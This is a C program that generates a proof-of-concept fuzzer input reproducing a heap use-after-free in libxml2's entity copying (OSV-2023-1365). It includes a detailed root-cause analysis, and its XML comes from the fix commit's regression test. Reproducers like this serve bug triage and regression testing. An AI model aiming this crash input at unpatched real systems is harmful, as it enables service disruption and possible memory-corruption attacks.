/*
 * gen_poc.c: Generate a binary PoC for OSV-2023-1365
 *
 * The libxml2 xml fuzzer expects input in a specific format:
 *   - 4 bytes: parser options (big-endian, per xmlFuzzReadInt)
 *   - 4 bytes: maxAlloc limit (big-endian), 0 disables limit
 *   - Then: entity strings as URL\\\n content\\\n pairs
 *
 * Bug: heap-use-after-free READ 8 in xmlStaticCopyNode
 * Call chain: xmlStaticCopyNode -> xmlDocCopyNode -> xmlParseReference
 * OSS-Fuzz bug: 65363
 * Introduced: ecfbcc8a (parser: Rework general entity parsing)
 * Fixed: f3fa34dc (parser: Fix general entity parsing)
 *
 * Root cause:
 *
 *   Commit ecfbcc8a reworked general entity parsing to reuse the
 *   existing parser context (xmlCtxtParseContent) rather than
 *   creating a new one. This causes the namespace database (nsdb)
 *   to be shared between the main document parse and entity content
 *   parsing.
 *
 *   When an internal entity contains namespace-prefixed elements,
 *   the entity content parser resolves prefixes through the shared
 *   nsdb and stores namespace pointers (node->ns) that reference
 *   xmlNs nodes from the enclosing document scope. These entity
 *   children are cached in ent->children.
 *
 *   On subsequent references to the same entity in different namespace
 *   contexts, xmlParseReference calls xmlDocCopyNode -> xmlStaticCopyNode
 *   to copy the cached entity children. The copy function accesses
 *   node->ns->prefix (READ 8) on entity children whose namespace pointers
 *   may reference stale or incorrectly-scoped namespace data from the
 *   shared nsdb.
 *
 *   The fix creates a fresh nsdb for each entity parse, preventing
 *   entity content from inheriting namespace declarations from the
 *   referencing context.
 *
 * PoC XML (canonical regression test from the fix commit):
 *
 *   This is the exact ns-ent.xml test file added by the fix commit
 *   f3fa34dc. It exercises both default-namespace entities (ent1)
 *   and prefixed-namespace entities (ent2), each referenced twice
 *   under different namespace bindings.
 *
 * Required flags:
 *   XML_PARSE_NOENT (2): enables entity substitution so
 *     xmlParseReference takes the replaceEntities path and calls
 *     xmlDocCopyNode on cached entity children.
 *
 * The xml fuzzer (fuzz/xml.c) runs the input through three parsers:
 *   1. Pull parser (xmlCtxtReadMemory)
 *   2. Push parser (xmlCreatePushParserCtxt + xmlParseChunk)
 *   3. Reader (xmlReaderForMemory)
 * All three exercise xmlParseReference and the vulnerable copy path.
 */

#include <stdio.h>
#include <string.h>
#include <stdint.h>

/*
 * Write a 4-byte big-endian integer (matching xmlFuzzReadInt format).
 */
static void write_be32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xFF, f);
    fputc((v >> 16) & 0xFF, f);
    fputc((v >>  8) & 0xFF, f);
    fputc((v >>  0) & 0xFF, f);
}

/*
 * Write a fuzz-format string: content with backslashes escaped,
 * terminated by backslash-newline.
 */
static void write_fuzz_string(FILE *f, const char *str) {
    size_t len = strlen(str);
    for (size_t i = 0; i < len; i++) {
        fputc(str[i], f);
        if (str[i] == '\\')
            fputc('\\', f);  /* escape backslashes */
    }
    fputc('\\', f);
    fputc('\n', f);
}

int main(int argc, char **argv) {
    const char *outfile = "poc.bin";
    FILE *f;

    if (argc > 1)
        outfile = argv[1];

    f = fopen(outfile, "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    /*
     * Parser options: XML_PARSE_NOENT (2) to enable entity substitution.
     * This causes xmlParseReference to take the replaceEntities path
     * and call xmlDocCopyNode on cached entity children.
     */
    write_be32(f, 2);  /* XML_PARSE_NOENT = 2 */

    /*
     * maxAlloc: 0 disables the malloc failure injection.
     * xmlFuzzReadInt(4) returns 0 -> 0 % (size+100) = 0 -> no limit.
     */
    write_be32(f, 0);

    /*
     * Entity pairs (URL then content):
     *
     * This is the canonical regression test from the fix commit
     * (test/errors/ns-ent.xml). It declares two entities:
     *
     *   ent1: "<elem/>" -- unprefixed element, affected by default xmlns
     *   ent2: "<ns:elem/>" -- prefixed element, affected by xmlns:ns
     *
     * Each entity is referenced twice under different namespace bindings:
     *
     *   <a xmlns="urn:a">&ent1;</a>      -- 1st ref, default ns = urn:a
     *   <b xmlns="urn:b">&ent1;</b>      -- 2nd ref, default ns = urn:b
     *   <a xmlns:ns="urn:a">&ent2;</a>   -- 1st ref, ns = urn:a
     *   <b xmlns:ns="urn:b">&ent2;</b>   -- 2nd ref, ns = urn:b
     *
     * The vulnerable code path:
     *   1st ref: entity parsed via xmlCtxtParseContent with shared nsdb.
     *            Entity children get node->ns from enclosing scope's nsdb.
     *            Children cached in ent->children, copies made via
     *            xmlDocCopyNode (line 7423 in parser.c).
     *   2nd ref: ent->children (copies from 1st ref) are copied again
     *            via xmlDocCopyNode (line 7423). xmlStaticCopyNode
     *            accesses node->ns->prefix (READ 8). The node->ns pointer
     *            may reference namespace data that was set up through the
     *            shared nsdb during entity parsing, creating a correctness
     *            bug (wrong namespace) and potentially a UAF if the nsdb
     *            extra array was reallocated between references.
     */
    const char *url = "main.xml";
    const char *xml =
        "<!DOCTYPE doc [\n"
        "  <!ENTITY ent1 \"<elem/>\">\n"
        "  <!ENTITY ent2 \"<ns:elem/>\">\n"
        "]>\n"
        "<doc>\n"
        "    <a xmlns=\"urn:a\">&ent1;</a>\n"
        "    <b xmlns=\"urn:b\">&ent1;</b>\n"
        "    <a xmlns:ns=\"urn:a\">&ent2;</a>\n"
        "    <b xmlns:ns=\"urn:b\">&ent2;</b>\n"
        "</doc>";

    write_fuzz_string(f, url);
    write_fuzz_string(f, xml);

    fclose(f);
    fprintf(stderr, "Generated %s\n", outfile);
    return 0;
}
